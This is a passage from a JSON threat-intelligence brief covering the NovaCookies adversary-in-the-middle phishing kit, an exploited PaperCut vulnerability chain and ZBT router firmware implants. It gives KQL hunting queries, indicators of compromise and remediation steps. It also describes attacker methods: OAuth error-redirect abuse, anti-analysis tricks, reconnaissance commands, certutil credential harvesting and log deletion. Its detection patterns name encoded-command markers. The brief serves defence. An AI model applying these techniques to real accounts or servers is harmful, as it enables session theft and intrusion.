   "DEFENDER XDR KQL — controller-facing tooling running on engineering workstations, which is where a change to controller passwords or a disconnection would be issued from.\n\nlet otTooling = dynamic([\"tia portal\", \"step7\", \"s7\", \"rslinx\", \"rslogix\", \"studio 5000\", \"unity pro\", \"ecostruxure\", \"codesys\", \"kepserver\", \"modscan\", \"modbus\"]);\nDeviceProcessEvents\n| where Timestamp > ago(30d)\n| where tolower(FileName) has_any (otTooling) or tolower(ProcessCommandLine) has_any (otTooling)\n| join kind=leftouter (\n    DeviceNetworkEvents\n    | where Timestamp > ago(30d)\n    | where RemotePort in (502, 102, 44818, 4840)\n    | project DeviceId, RemoteIP, RemotePort, NetworkTime = Timestamp\n) on DeviceId\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, RemoteIP, RemotePort\n| order by Timestamp desc",
   "Treat any facility that switched to manual operation during the campaign window as an incident scope, not a resolved outage: controller credentials, project files and backup configurations all need review before automated control is restored."
  ],
  "source": "Security Affairs, SC Media, The Register, Fox News, Telegraph via Kurdistan24, CISA advisory (Jul 30, 2026), TechTimes, Foreign Policy"
 },
 "novacookies": {
  "eyebrow": "Island Security Research · NovaCookies · AiTM PhaaS · $320/month · 755 published domains",
  "title": "A rented adversary-in-the-middle relay with Entra's own MFA method taxonomy, a configurable anti-analysis engine and a Docusign-inside-Docusign delivery chain",
  "overview": "The structural point Island makes is that campaigns which look unrelated can be deployments of the same rented product, so blocking yesterday's domain removes one disposable part of the operation. The kit is purpose-built against Microsoft 365 rather than generic: it carries dedicated handling for authenticator push approval, authenticator one-time codes and SMS codes using Microsoft's own internal names for those methods, with separate error states for a rejected password, a rejected code and a rejected SMS. That is why ordinary one-time codes and push approvals do not solve the problem — the victim completes a real authentication through an attacker-controlled intermediary. Island's stated structural defense is phishing-resistant authentication: passkeys, FIDO2 security keys and other origin-bound credentials will not authenticate to the wrong site, so the relay cannot complete the same exchange.",
  "technical": [
   "Commercial model: advertised at $320 for a month of access or $200 for fourteen days, with domains, hosting, redirect services and support described as part of the package. Both advertised redirect variants (Microsoft and Google) appear in observed campaign infrastructure. The operator-facing dashboard carries a circular \"Nova Cookies\" badge and the line \"Secured by Nova Systems\".",
   "Primary capability: a live AiTM relay. The target sees a Microsoft 365 sign-in experience while the service passes the authentication exchange to Microsoft in real time, relaying password and MFA prompts step by step, then captures the session cookie representing the authenticated session.",
   "Delivery chain (strongest observed): a genuine Docusign notification opening a genuine Docusign envelope in the real viewer, containing a counterfeit share notice claiming an accounting department had shared a remittance-advice PDF. The malicious destination sat inside the document, below the layer most mail security products inspect. Island states Docusign and Microsoft were not compromised — their services were used as delivery and redirection layers.",
   "Redirect technique: the OAuth error-redirect abuse Microsoft described in March 2026. An application registered in an attacker-controlled tenant has a redirect URI pointing at attacker infrastructure; a genuine Microsoft authorization URL with prompt=none is designed to fail silent authentication, so Entra sends the browser from its own domain to the pre-registered hop. No token is issued and no consent prompt appears. Unlike a classic open redirect the destination must already be registered to the application, so the value is the trusted starting domain — and the application IDs give identity providers a disruption point when malicious registrations are reported. A smaller number of chains used Google's sign-in endpoint for the same role.",
   "Other delivery paths: links passing through legitimate websites that appeared to have been compromised, and legitimate online services abused to host or redirect content, keeping the final phishing domain out of the original message.",
   "Infrastructure naming: many domains borrow recognizable company names then mutate them with inserted letters, dropped characters or long concatenations under .vu. Island is explicit that these names are lure infrastructure, not evidence the referenced companies were compromised, and that the borrowed name and the targeted organization were not reliably the same across the corpus.",
   "Lure URL shape: paths begin with alternating-case labels such as PwPt-sHaRe, Ms36-AcCeSs and ClOd-ViEw, combining shortened cloud-product references with share, access and view actions, followed by a long changing token and a shorter final token. Island cautions that mixed casing is a campaign fingerprint rather than a standalone signature — search and scan systems may normalize case.",
   "Anti-analysis: Cloudflare is the visible front gate but not the whole story. The kit layers browser checks with client-side proof of work, short-lived context binding and runtime inspection checks, and scores the browser on interaction patterns, device and browser characteristics, automation markers and attempts to open developer tools. It forgives a failed check when interaction looks genuine and skips expensive checks for a visitor that already looks human. One documented example is debugger timing — measuring execution across a debugger statement and withholding the lure on a pause. These controls are buyer-configurable with tunable intervals, callbacks and strict or development presets, so resistance to analysis is a configurable product capability rather than a fixed sequence. Island's own characterisation is scanner-resistant, not scanner-proof: full-browser public scanners have captured the lure on some occasions.",
   "Yield tuning: in one preserved observation the same page accepted repeated password submissions before advancing, consistent with collecting more than one candidate password. Island reports this as observed behaviour without assigning a fixed product rule. The kit also counts submission attempts.",
   "Timeline: low-volume infrastructure present in late 2025; sharp expansion from mid-May 2026; first-seen dates peaked in June; new infrastructure continued appearing through August 2026. Island notes Proofpoint reported campaign activity increasing from March through May before declining in June, and attributes the difference to measuring infrastructure visibility rather than email or campaign volume."
  ],
  "iocs": [
   {
    "value": "fordmotbvmorcompany.vu",
    "type": "Domain",
    "note": "Example from Island's dedicated attacker-infrastructure release. Brand-themed mutation — \"Ford Motor Company\" readable through inserted characters. Lure infrastructure only; Island states this is not evidence the referenced company was compromised or targeted.",
    "source": "https://github.com/island-io/island-security-research-artifacts/tree/main/novacookies"
   },
   {
    "value": "morganstbftanley.vu",
    "type": "Domain",
    "note": "Example from the IOC release — extra letters splitting the recognizable \"Morgan Stanley\" name. Lure infrastructure only.",
    "source": "https://github.com/island-io/island-security-research-artifacts/tree/main/novacookies"
   },
   {
    "value": "munichreinsurdjqanceamericainc.vu",
    "type": "Domain",
    "note": "Example from the IOC release — inserted characters distorting \"Munich Reinsurance America Inc.\" Lure infrastructure only.",
    "source": "https://github.com/island-io/island-security-research-artifacts/tree/main/novacookies"
   },
   {
    "value": "internationalbusinessmaclsihinesibm.vu",
    "type": "Domain",
    "note": "Example from the IOC release — long-form IBM name and acronym together with a misspelling buried in the middle. Lure infrastructure only.",
    "source": "https://github.com/island-io/island-security-research-artifacts/tree/main/novacookies"
   },
   {
    "value": "secondsightsystilqemsllc.vu",
    "type": "Domain",
    "note": "Published IOC domain shown in Island's preserved lure capture, hosting a PwPt-sHaRe path.",
    "source": "https://www.island.io/blog/novacookies-at-scale-inside-the-320-phishing-service-targeting-hundreds-of-organizations"
   },
   {
    "value": "PwPt-sHaRe / Ms36-AcCeSs / ClOd-ViEw",
    "type": "String",
    "note": "Alternating-case lure path prefixes, each followed by a long changing token and a shorter final token. Island treats the shape as contextual evidence, not a standalone signature — case may be normalized by scanners.",
    "source": "https://www.island.io/blog/novacookies-at-scale-inside-the-320-phishing-service-targeting-hundreds-of-organizations"
   },
   {
    "value": "login.microsoftonline.com/common/oauth2/v2.0/authorize with prompt=none and a non-corporate redirect_uri",
    "type": "Behavior",
    "note": "The OAuth error-redirect hop: an app registered in an attacker-controlled tenant, a genuine Microsoft authorization URL designed to fail silent authentication, and Entra redirecting the browser to the pre-registered attacker hop. No token issued, no consent prompt.",
    "source": "https://www.microsoft.com/en-us/security/blog/2026/03/02/oauth-redirection-abuse-enables-phishing-malware-delivery/"
   },
   {
    "value": "Genuine Docusign envelope containing a counterfeit share notice with an external link inside the document",
    "type": "Behavior",
    "note": "Delivery pattern that passes sender-authentication and reputation checks at every layer above the document body.",
    "source": "https://www.island.io/blog/novacookies-at-scale-inside-the-320-phishing-service-targeting-hundreds-of-organizations"
   },
   {
    "value": "Nova Cookies / Nova Systems",
    "type": "Actor Alias",
    "note": "Operator-dashboard branding: a circular \"Nova Cookies\" badge and the line \"Secured by Nova Systems\". Island stresses the shared product does not imply a single threat actor — attribution must separate the service, the advertising account and the individual customer.",
    "source": "https://www.island.io/blog/novacookies-at-scale-inside-the-320-phishing-service-targeting-hundreds-of-organizations"
   }
  ],
  "iocNote": "The five domains above are examples; the full versioned release publishes 755 domains assessed as dedicated malicious infrastructure at github.com/island-io/island-security-research-artifacts (novacookies). Island's list is sanitized — no victim data, personalized lure links, Telegram identities, wallet addresses or internal telemetry. Retain the package version: Island's own guidance is that indicators are evidence with an expiration date, that NovaCookies rotates infrastructure, and that legitimate domains can be abused, so IOCs should be combined with behaviour-based detection. Ingest the release rather than the five samples here.",
  "mitigation": [
   "Put phishing-resistant authentication on high-value accounts. Passkeys, FIDO2 security keys and other origin-bound credentials structurally interrupt an AiTM relay — this is Island's stated structural defense and the only control that removes the capability rather than raising its cost.",
   "Detect the product, not only yesterday's domains: correlate the .vu lure shape, brand-themed hostname mutations, mixed-case document-action tokens and redirect chains into Microsoft-style relays. Treat any single feature as weak evidence.",
   "Keep dedicated infrastructure separate from potentially compromised hosts. Block attacker-controlled domains at the apex where appropriate, but use URL- or path-level controls and investigation for legitimate sites that may have been abused.",
   "Assume the delivery path may be trusted until its final hop. Inspect links inside document viewers and collaboration platforms, and do not depend on referrer data to reconstruct how a user arrived.",
   "Report malicious application registrations to Microsoft: because the redirect destination must already be registered to the application, the application IDs are a disruption point for the identity provider.",
   "Enable Entra ID Token Protection (Conditional Access token binding) alongside FIDO2 — the same control set already recommended in this brief for the Mirage2FA PhaaS campaign."
  ],
  "response": [
   "Treat a completed relay as session theft, in Island's order: revoke sessions, reset credentials, inspect identity-provider sign-ins, and review new MFA methods, OAuth grants, forwarding rules and inbox rules.",
   "DEFENDER XDR KQL — OAuth application consent and service-principal additions, unpacking RawEventData to surface the redirect URI. The NovaCookies hop needs an app registered in an attacker-controlled tenant whose redirect URI points at attacker infrastructure, so the redirect URI is the discriminator — and the AppId is the disruption point to report to Microsoft.\n\nCloudAppEvents\n| where Timestamp > ago(30d)\n| where ActionType in~ (\"Consent to application.\",\"Add service principal.\",\"Add OAuth2PermissionGrant.\",\"Add delegated permission grant.\")\n| extend ModifiedProps = tostring(todynamic(RawEventData.ModifiedProperties))\n| extend AppId = tostring(RawEventData.ObjectId)\n| extend ActorUpn = tostring(RawEventData.UserId)\n| extend ActorIp = tostring(RawEventData.ClientIP)\n| where ModifiedProps has_any (\"ReplyUrl\",\"redirect\")\n| project Timestamp, ActionType, ActorUpn, ActorIp, AppId, ModifiedProps\n| order by Timestamp desc\n// Technique credit — RawEventData unpacking pattern per Steven Lim (github.com/SlimKQL, LinkedIn @0x534c)",
   "SENTINEL KQL — AiTM session-theft signature in sign-in logs: a successful interactive sign-in followed within minutes by non-interactive activity on the same account from a different ASN or country.\n\nlet win = 30m;\nlet interactive = SigninLogs\n  | where TimeGenerated > ago(14d) and ResultType == 0\n  | project UserPrincipalName, tI = TimeGenerated, ipI = IPAddress, asnI = AutonomousSystemNumber, cI = tostring(LocationDetails.countryOrRegion);\nlet noninteractive = AADNonInteractiveUserSignInLogs\n  | where TimeGenerated > ago(14d) and ResultType == 0\n  | project UserPrincipalName, tN = TimeGenerated, ipN = IPAddress, asnN = AutonomousSystemNumber, cN = tostring(LocationDetails.countryOrRegion), AppDisplayName;\ninteractive\n| join kind=inner noninteractive on UserPrincipalName\n| where tN between (tI .. tI + win)\n| where asnI != asnN or cI != cN\n| project UserPrincipalName, tI, ipI, cI, asnI, tN, ipN, cN, asnN, AppDisplayName\n| order by tI desc",
   "SENTINEL KQL — sign-ins from addresses Defender for Cloud Apps already tags as hostile, plus the Entra risk detections that name the AiTM primitives directly. Highest signal for a relay: the authentication is genuine, so the tell is where the resulting session is replayed from.\n\nlet hostileTags = dynamic([\"Brute force attacker\",\"Password spray attacker\",\"malicious\",\"Possible Hackers\",\"Tor\",\"Anonymous proxy\",\"Botnet\"]);\nunion isfuzzy=true\n  (SigninLogs\n   | where TimeGenerated > ago(30d) and ResultType == 0\n   | where IPTags has_any (hostileTags)\n   | project TimeGenerated, UserPrincipalName, IPAddress, Signal = tostring(IPTags), App = AppDisplayName, Country = tostring(LocationDetails.countryOrRegion), Source = \"SigninLogs\"),\n  (AADNonInteractiveUserSignInLogs\n   | where TimeGenerated > ago(30d) and ResultType == 0\n   | where IPTags has_any (hostileTags)\n   | project TimeGenerated, UserPrincipalName, IPAddress, Signal = tostring(IPTags), App = AppDisplayName, Country = tostring(LocationDetails.countryOrRegion), Source = \"NonInteractive\"),\n  (AADUserRiskEvents\n   | where TimeGenerated > ago(30d)\n   | where RiskEventType has_any (\"anomalousToken\",\"tokenIssuerAnomaly\",\"adversaryInTheMiddle\",\"anonymizedIPAddress\",\"maliciousIPAddress\",\"unfamiliarFeatures\")\n   | project TimeGenerated, UserPrincipalName, IPAddress, Signal = RiskEventType, App = RiskDetail, Country = tostring(Location.countryOrRegion), Source = \"RiskEvents\")\n| order by TimeGenerated desc\n// Technique credit — IPTags enrichment and AADUserRiskEvents AiTM correlation per Steven Lim (github.com/SlimKQL, LinkedIn @0x534c)",
   "DEFENDER XDR KQL — what the stolen session was used for. The operator holds a valid M365 session cookie, so post-theft activity looks like the user: bulk file access, mailbox rule creation, and Copilot-driven summarization of whatever the account can reach.\n\nlet suspectUsers = dynamic([]);  // populate from the sign-in correlation above\nCloudAppEvents\n| where Timestamp > ago(30d)\n| where array_length(suspectUsers) == 0 or AccountDisplayName in~ (suspectUsers)\n| where ActionType in~ (\"FileDownloaded\",\"FileSyncDownloadedFull\",\"New-InboxRule\",\"Set-Mailbox\",\"Add-MailboxPermission\",\"CopilotInteraction\",\"MailItemsAccessed\")\n| extend ActorIp = tostring(RawEventData.ClientIP)\n| extend UserAgentStr = tostring(RawEventData.UserAgent)\n| extend CopilotData = todynamic(RawEventData.CopilotEventData)\n| extend CopilotResources = tostring(CopilotData.AccessedResources)\n| extend CopilotAppHost = tostring(CopilotData.AppHost)\n| summarize events = count(), actions = make_set(ActionType, 15), agents = make_set(UserAgentStr, 5), copilotHosts = make_set(CopilotAppHost, 5), copilotData = make_set(CopilotResources, 5)\n    by AccountDisplayName, ActorIp, bin(Timestamp, 1h)\n| where events > 20 or array_length(actions) > 3\n| order by events desc\n// Technique credit — CloudAppEvents CopilotEventData unpacking per Steven Lim (github.com/SlimKQL, LinkedIn @0x534c)",
   "SENTINEL KQL — post-relay persistence: new MFA methods, OAuth grants and mailbox forwarding or inbox rules added after a suspect sign-in.\n\nunion isfuzzy=true\n  (AuditLogs\n   | where TimeGenerated > ago(30d)\n   | where OperationName has_any (\"Add strong authentication\",\"Update user\",\"Consent to application\",\"Add app role assignment\",\"Add service principal\")\n   | project TimeGenerated, OperationName, actor = tostring(InitiatedBy.user.userPrincipalName), target = tostring(TargetResources[0].displayName)),\n  (OfficeActivity\n   | where TimeGenerated > ago(30d)\n   | where Operation has_any (\"New-InboxRule\",\"Set-InboxRule\",\"Set-Mailbox\",\"UpdateInboxRules\")\n   | project TimeGenerated, OperationName = Operation, actor = UserId, target = OfficeObjectId)\n| order by TimeGenerated desc",
   "DEFENDER XDR KQL — endpoint-side lure traffic: the .vu infrastructure and the mixed-case document-action path shape. Replace the domain list with the 755-domain release.\n\nlet lurePaths = dynamic([\"PwPt-sHaRe\",\"Ms36-AcCeSs\",\"ClOd-ViEw\",\"PwPt-\",\"Ms36-\",\"ClOd-\"]);\nDeviceNetworkEvents\n| where Timestamp > ago(60d)\n| where RemoteUrl endswith \".vu\" or RemoteUrl has_any (lurePaths)\n| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteUrl, RemoteIP\n| order by Timestamp asc",
   "DEFENDER XDR KQL — browser navigation from a document viewer or identity endpoint into an unfamiliar destination, the shape of the trusted-until-the-last-hop chain.\n\nDeviceEvents\n| where Timestamp > ago(60d)\n| where ActionType == \"BrowserLaunchedToOpenUrl\"\n| where RemoteUrl has_any (\"docusign\",\"login.microsoftonline.com/common/oauth2\",\"accounts.google.com/o/oauth2\")\n| project Timestamp, DeviceName, AccountName, RemoteUrl, InitiatingProcessFileName\n| order by Timestamp desc",
   "An organization's appearance in Island's campaign artifacts indicates targeting, not interaction or compromise. Confirming credential submission or session theft requires separate evidence from your own identity logs — do not treat an IOC match alone as an incident."
  ],
  "source": "Island Security Research — Shachar Gritzman, \"NovaCookies at scale: Inside the $320 Phishing Service Targeting Hundreds of Organizations\", Aug 26, 2026; companion IOC release at github.com/island-io/island-security-research-artifacts"
 },
 "papercut": {
  "eyebrow": "PaperCut NG/MF · CVE-2026-82078 + CVE-2026-81578 · Exploited zero-day · Second emergency patch",
  "title": "Two chained PaperCut flaws give unauthenticated Java code execution inside the application process; patch bypasses already found",
  "overview": "PaperCut sits in the worst possible place for this class of bug: internet-facing, trusted by the print estate, and holding spooled documents. PaperCut disclosed on Aug 27, 2026 that all versions of NG and MF are affected and that it is aware of confirmed customer incidents. The actionable read is that patching is necessary but not sufficient — watchTowr reports multiple bypasses of the first emergency patch and an additional authentication bypass, likely closed by the second. Remove internet exposure now, apply the latest emergency patch, and hunt: the post-exploitation tooling deletes its own artifacts and the server's logs, so absent or truncated logs are themselves evidence. No actor has been named and no attribution published.",
  "technical": [
   "Sep 6 update — Arctic Wolf Adversary Research Team: exploitation of CVE-2026-81578 and CVE-2026-82078 leading to command execution, reconnaissance and attempts to create privileged accounts, concentrated in the education sector across K-12 schools and major universities in the US and Europe.",
   "Arctic Wolf's observed post-exploitation activity: delivery of Windows registry hive collection tools, Metasploit/Meterpreter-related Java payloads, and commands used to identify hosts, users, processes and sensitive configuration data. Reported specifics include uname, whoami, ver and tasklist, an account named \"Administrator17\", inbound GET requests from 45.142.193[.]132 for /custom/pcp_*.txt, and credential-harvesting tooling delivered via certutil.",
   "SOC Prime, Sep 2: a working proof of concept for the combined CVE-2026-81578 / CVE-2026-82078 chain is publicly available, with exploit references in vulnerability databases and security tooling, lowering the barrier for scanning and mass exploitation of unpatched internet-facing servers. Huntress's first observed incident was Aug 26, 2026; one intrusion lasted under two minutes, ran base64-encoded reconnaissance commands to establish the PaperCut service identity, Windows version and running processes, and delivered malicious Java .class files.",
   "Escalation: SecurityWeek reported on Sep 1, 2026 that exploitation has moved beyond scanning and probing into active intrusions. Treat any internet-exposed PaperCut server that was unpatched after Aug 27 as presumed compromised until the log review below is complete.",
   "KEV: CISA added CVE-2026-82078 and CVE-2026-81578 to the Known Exploited Vulnerabilities catalog on Aug 31, 2026 under BOD 26-04, with the Forensics Triage Requirements applying — remediation alone does not discharge the obligation where the asset was internet-facing.",
   "CVE-2026-82078 (CVSS 9.4) — unsafe dynamic class loading in the database connection utilities of PaperCut MF and NG. The application instantiates database driver classes based on configurable driver names without validating them against an allowlist of approved drivers.",
   "CVE-2026-81578 (CVSS 8.8) — improper access control in the web management interface. Under specific conditions, unauthenticated remote requests targeting administrative functions can trigger backend actions before access validation checks complete.",
   "Huntress's account of the mechanism: a specifically crafted request can refer to one page that is rendered for the response and another page that owns the component or action being executed. PaperCut's authorization check could trust the rendered page and miss the permissions required by the component behind it, so an unauthenticated request can change server configuration, reach sensitive endpoints and execute attacker-controlled code.",
   "watchTowr reports attackers chaining both CVEs to bypass authentication and gain RCE, and says it discovered multiple patch bypasses plus a further authentication bypass, all likely addressed in the second emergency patch.",
   "Observed post-exploitation (Huntress, two customer environments): Base64-encoded commands executed on the server, chaining \"whoami & ver\" to establish account and OS. A follow-on OS-agnostic Java .class file fingerprints the machine and writes a directory listing to \"Udydn.out\" under a \"/data/content/\" path relative to the installation directory, then deletes Udydn.out, the server's \"server.log\", and \"/data/internal/derby.log\".",
   "In a separate incident on Aug 27, 2026 the actors used a different .class file variant running \"whoami & ver & tasklist\" to also capture the running process list.",
   "Historical precedent: CVE-2023-27350 in PaperCut MF/NG (CVSS 9.8) was exploited in 2023 by Russian threat actors and by Lace Tempest to deliver Cl0p and LockBit ransomware. Treat a PaperCut compromise as a probable ransomware precursor, not an isolated print-server issue."
  ],
  "iocs": [
   {
    "type": "IP",
    "value": "45.142.193.132",
    "note": "Sep 6 — source of inbound GET requests for /custom/pcp_*.txt paths on compromised PaperCut servers (Arctic Wolf, via The Hacker News)"
   },
   {
    "type": "URL",
    "value": "/custom/pcp_*.txt",
    "note": "Requested path pattern associated with the exploitation activity Arctic Wolf observed"
   },
   {
    "type": "String",
    "value": "Administrator17",
    "note": "Privileged Windows account created during post-exploitation in the education-sector campaign"
   },
   {
    "type": "Behavior",
    "value": "PaperCut service process spawning uname, whoami, ver or tasklist",
    "note": "Discovery commands reported by Arctic Wolf; Huntress recorded the same shape as base64-encoded reconnaissance"
   },
   {
    "type": "Behavior",
    "value": "Registry hive collection tooling and certutil-delivered credential harvesting on a PaperCut Application Server",
    "note": "Arctic Wolf post-exploitation activity — the campaign's objective is credential theft"
   },
   {
    "type": "Behavior",
    "value": "Metasploit/Meterpreter-related Java payloads or .class files written by the PaperCut process",
    "note": "Payload delivery via the vulnerable server, reported by Arctic Wolf and Huntress"
   },
   {
    "value": "pc-app.exe",
    "type": "Filename",
    "note": "PaperCut Application Server process. PaperCut names suspicious post-exploitation activity originating from pc-app.exe as an indicator — child process creation from this parent is the primary behavioural signal.",
    "source": "https://www.papercut.com/kb/Main/security-bulletin-27-aug-2026-urgent-security-advisory/"
   },
   {
    "value": "Udydn.out",
    "type": "Filename",
    "note": "Directory-listing output written by the post-exploitation Java .class file to a /data/content/ path relative to the PaperCut installation directory, then deleted by the same file.",
    "source": "https://www.huntress.com/blog/papercut-actively-exploited"
   },
   {
    "value": "ERROR DatabaseUtils - Database error looking up cardID: VALUES CAST",
    "type": "String",
    "note": "server.log entry named by both PaperCut and watchTowr as the primary log-based hunting artifact for exploitation of this chain.",
    "source": "https://www.papercut.com/kb/Main/security-bulletin-27-aug-2026-urgent-security-advisory/"
   },
   {
    "value": "ERROR No suitable driver found for jdbc:no:x",
    "type": "String",
    "note": "server.log entry published by PaperCut as an indicator — consistent with the CVE-2026-82078 dynamic driver-class loading path being exercised.",
    "source": "https://www.papercut.com/kb/Main/security-bulletin-27-aug-2026-urgent-security-advisory/"
   },
   {
    "value": "Missing, truncated or deleted PaperCut server.log and /data/internal/derby.log",
    "type": "Behavior",
    "note": "PaperCut lists missing or unexpectedly truncated server.log files as an indicator; Huntress confirms the post-exploitation .class file deletes server.log and derby.log. Absence of the log is the evidence.",
    "source": "https://www.huntress.com/blog/papercut-actively-exploited"
   },
   {
    "value": "whoami & ver & tasklist",
    "type": "Behavior",
    "note": "Chained discovery command observed by Huntress in the Aug 27, 2026 incident; the earlier variant was \"whoami & ver\". Executed Base64-encoded from the PaperCut process.",
    "source": "https://www.huntress.com/blog/papercut-actively-exploited"
   }
  ],
  "iocNote": "No attacker IPs, domains or file hashes have been published for this campaign. Every published indicator is behavioural or log-based, and the post-exploitation tooling deletes the logs it appears in — hunt in forwarded or archived copies of server.log, not the live file.",
  "mitigation": [
   "Apply Emergency Patch Release 2 for PaperCut NG/MF v24, v25 or v26 on Windows, Linux or macOS — patches for v24 followed the v25/v26 release later on Aug 28. PaperCut is urging customers who already installed the first emergency patch to install Release 2 as well. The second patch includes hardening beyond the original emergency patch and is believed to close the watchTowr patch bypasses; the first patch alone should not be treated as remediation.",
   "Remove public internet exposure from the PaperCut Application Server immediately, even where no suspicious activity has been observed. PaperCut's instruction is to use firewall rules, network access controls or equivalent measures so the web interfaces cannot be reached from untrusted internet addresses.",
   "Restrict Application Server web access to trusted IP ranges, or place it behind a VPN or another controlled administrative path.",
   "Treat any instance that was internet-facing before patching as potentially compromised and scope accordingly: PaperCut holds spooled document content and is an inbound pivot into the corporate network."
  ],
  "response": [
   "DEFENDER XDR KQL — child processes spawned by the PaperCut application server, the highest-fidelity signal that code execution completed.\n\nDeviceProcessEvents\n| where Timestamp > ago(30d)\n| where InitiatingProcessFileName =~ \"pc-app.exe\"\n   or InitiatingProcessFolderPath has \"PaperCut\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\",\"whoami.exe\",\"tasklist.exe\",\"sh\",\"bash\",\"java\")\n| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine\n| order by Timestamp desc",
   "DEFENDER XDR KQL — the Udydn.out artifact and the log-deletion behaviour that follows it.\n\nDeviceFileEvents\n| where Timestamp > ago(30d)\n| where FileName in~ (\"Udydn.out\",\"server.log\",\"derby.log\")\n| where FolderPath has_any (\"PaperCut\",\"/data/content/\",\"/data/internal/\")\n| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine\n| order by Timestamp asc",
   "DEFENDER XDR KQL — Base64-encoded command execution from the PaperCut process tree.\n\nDeviceProcessEvents\n| where Timestamp > ago(30d)\n| where InitiatingProcessFolderPath has \"PaperCut\" or InitiatingProcessFileName =~ \"pc-app.exe\"\n| where ProcessCommandLine has_any (\"-enc\",\"-EncodedCommand\",\"FromBase64String\",\"base64 -d\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
   "SENTINEL KQL — unauthenticated requests to PaperCut administrative paths on the default ports, to scope who could reach the interface and from where.\n\nCommonSecurityLog\n| where TimeGenerated > ago(30d)\n| where DestinationPort in (9191, 9192)\n| where RequestURL has_any (\"/app\",\"/admin\",\"/rpc/api\")\n| summarize hits = count(), paths = make_set(RequestURL, 25), firstSeen = min(TimeGenerated), lastSeen = max(TimeGenerated)\n    by SourceIP, DestinationIP\n| where hits > 20\n| order by hits desc",
   "SENTINEL KQL — the published server.log strings, where PaperCut logs are forwarded to the workspace. Run this against archived logs: the attacker deletes the live file.\n\nSyslog\n| where TimeGenerated > ago(60d)\n| where SyslogMessage has_any (\"Database error looking up cardID: VALUES CAST\", \"No suitable driver found for jdbc:no:x\")\n| project TimeGenerated, Computer, ProcessName, SyslogMessage",
   "Where server.log is missing or shorter than its rotation history implies, escalate rather than close: log destruction is part of the documented post-exploitation sequence.",
   "Given the 2023 precedent of PaperCut RCE leading to Cl0p and LockBit deployment, scope any confirmed compromise for lateral movement and staged exfiltration, not just for the web-tier artifact."
  ],
  "source": "PaperCut security bulletin (Aug 27, 2026), Huntress (John Hammond, Andrew Brandt), watchTowr (Jake Knott), The Hacker News"
 },
 "zbtimplants": {
  "eyebrow": "VulnCheck · CVE-2026-74232 (SPEAKINGSTONE) + CVE-2026-74233 (DARKLANTERN) · Factory implants · No fixed firmware",
  "title": "Two undocumented factory implants in ZBT router firmware give unauthenticated remote root; 203 internet-facing DARKLANTERN instances across 22 countries",
  "overview": "The exposure here is procurement, not patching. These are components shipped in the firmware by the manufacturer, found on an $88 white-labeled unit bought from a US supplier, and no advisory names a fixed release. ZBT sells identical hardware and firmware to resellers who put their own name on the case, so brand is not a usable check — model number is, and the IEEE-registered MAC prefixes 78:A3:51 and F8:5E:3C both belong to Shenzhen Zhibotong Electronics, letting an owner identify the manufacturer from the device's own address. VulnCheck flags CVE-2026-74233 in its own KEV catalog, whose criteria require public reporting of exploitation in the wild; CISA's Vulnrichment, recorded Aug 27, rates exploitation as proof-of-concept. None of the three ZBT CVEs appear in CISA's KEV catalog as of version 2026.08.27.",
  "technical": [
   "CVE-2026-74232 (SPEAKINGSTONE, CVSS 4.0 9.3 / CVSS 3.1 9.8) — runs as the service yunmgrd and beacons outbound over UDP 10000 to a hardcoded C2. Because it dials outward it functions from behind NAT and ordinary egress filtering. Its protocol supports message types that execute arbitrary commands as root, exfiltrate the WAN PPPoE username and password, write and read a DNS hijack list, and open a reverse SSH tunnel. VulnCheck describes it as a surveillance implant with root access to every device it runs on.",
   "CVE-2026-74233 (DARKLANTERN, CVSS 4.0 9.3 / CVSS 3.1 9.8) — runs as the service infosrvd on UDP 9992, which the router's stock firewall opens to inbound connections from any internet address. VulnCheck's advisory describes the authentication as ineffective: it rests on a hardcoded salt and an all-zero wildcard MAC value that bypasses its own address check.",
   "Exposure measurement: between Aug 18 and Aug 21, 2026 VulnCheck identified 203 internet-facing DARKLANTERN instances across 22 countries, self-reporting 16 distinct models. That figure counts hosts that answered a probe, not devices found compromised.",
   "SPEAKINGSTONE carries a hardcoded backup C2 domain used where no primary server was configured. VulnCheck found the domain unregistered, registered it, and ran a reverse-engineered implementation of the protocol. Beacons arrived immediately; as of Aug 21, 392 unique devices had reported in, 390 in China, 83 percent on China Mobile's network, 304 of 392 broadcasting SSIDs beginning \"CMCC\", and 363 self-reporting model L3_V2_8 on firmware 3.0.0.4.528. Because only devices without a configured primary C2 reach the backup, the 392 is a floor drawn from an unrepresentative subset.",
   "Affected builds (DARKLANTERN): Zbtlink WE1326, WE357, WE5926, WE5926-WD, WE826-Q, WE826-T2, WE826-WD, WG108 and WG3526 on firmware 19.1101; WE2426-C on 19.1112; WE5926-EC_QP on 20.0516; WF3526-P on 19.051; plus CTN720-W1, LF-1541 and MT7620N on 19.1101 and WRC1 on 20.0622 listed under an unidentified vendor.",
   "Affected builds (SPEAKINGSTONE): Zbtlink L3_V2_8 on 3.0.0.4.528, WE826-T2 on 19.1101, ZBT-7628 on 1.0.0.2.007, ZBT-ZBT7621 on 1.0.0.3.001; MoreQuick MQAC-7620, MQAC-7620A, MQAP-7620, MQAP-7620A and MQAP-7628 on 1.0.0.2.000; AP522 on 1.0.0.2.014, AP7628 and HC5661A on 3.0.0.4.380, APG721B on 19.0809, HK300 on 1.0.0.2.032 and MAP-N10 on 1.0.0.2.044 under an unidentified vendor.",
   "Version-range caveat worth carrying into any scan: the advisory pages display those builds as upper bounds, while the CVE records name each firmware as a single exact build and set every other version's default status to unknown. An owner on a build outside the listed set has no published basis for deciding whether the flaw applies.",
   "Prior art: both implants were found on a ZBT-WE826-T2 whose firmware was built in 2019, predating ENDLESSDOORS (CVE-2026-66747), the phone-home implant VulnCheck disclosed on Aug 5, 2026 in at least 20 Zbtlink models. MOFI Network, which develops its own firmware for the same platform, had an image free of all three implants."
  ],
  "iocs": [
   {
    "value": "b77811db4d218c65670a6c9a5b33c30ff81c6d779e15d658643138771178a818",
    "type": "SHA256",
    "note": "yunmgrd — the SPEAKINGSTONE C2 implant binary. Published by VulnCheck.",
    "source": "https://www.vulncheck.com/blog/zbt-darklantern-speakingstone"
   },
   {
    "value": "7e2e036fec2fe7ab4bbd43978d9296563894c92a112f5ac2f39957f12108e245",
    "type": "SHA256",
